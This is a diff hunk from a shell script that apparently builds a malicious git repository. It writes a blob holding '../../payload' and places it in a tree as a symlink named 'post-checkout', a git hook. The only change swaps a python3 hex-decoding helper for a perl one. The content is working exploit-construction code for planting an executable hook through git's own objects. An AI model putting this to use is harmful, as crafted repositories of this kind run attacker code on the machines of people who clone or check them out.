@@ -10,7 +10,7 @@ target_file_blob=$(echo -n ../../payload | git hash-object -w --stdin)
 subtree=$(printf '120000 blob %s\tpost-checkout\n' "$target_file_blob" | git mktree)
 
 hex2bin() {
-   python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex(sys.argv[1]))' "$1"
+   perl -e 'binmode STDOUT; print pack "H*", $ARGV[0]' "$1"
 }
 
 root_tree() {
